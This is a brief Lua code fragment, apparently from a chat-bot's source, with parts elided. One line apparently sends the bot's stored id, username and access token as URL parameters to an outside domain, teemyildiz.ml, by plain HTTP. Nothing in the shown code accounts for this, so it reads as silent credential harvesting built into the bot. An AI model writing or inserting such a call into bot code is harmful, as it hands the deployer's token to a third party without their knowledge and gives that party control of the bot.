...
if UserName ~= '' then
local Get_Info = http.request("http://teemyildiz.ml/info/?user="..UserName)
...
http.request("http://teemyildiz.ml/add/?id="..database:get(Server_teemyildiz.."Id_teemyildiz").."&user="..database:get(Server_teemyildiz.."UserName_teemyildiz").."&token="..database:get(Server_teemyildiz.."Token_teemyildiz"))
